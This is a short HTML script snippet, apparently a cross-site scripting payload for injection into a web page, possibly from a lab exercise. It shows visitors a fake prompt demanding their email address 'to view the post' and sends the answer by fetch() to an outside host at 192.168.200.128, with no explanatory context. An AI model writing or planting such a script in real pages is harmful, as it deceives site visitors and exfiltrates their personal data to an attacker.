<script>
	var email = prompt("Please, enter your email address to view the post", "exmample@example.com");
	if (email == null || email == "") {
		alert("Please, enter a valid email.");
	}
	else {
		fetch("http://192.168.200.128/?email=" + email)
	}
</script>
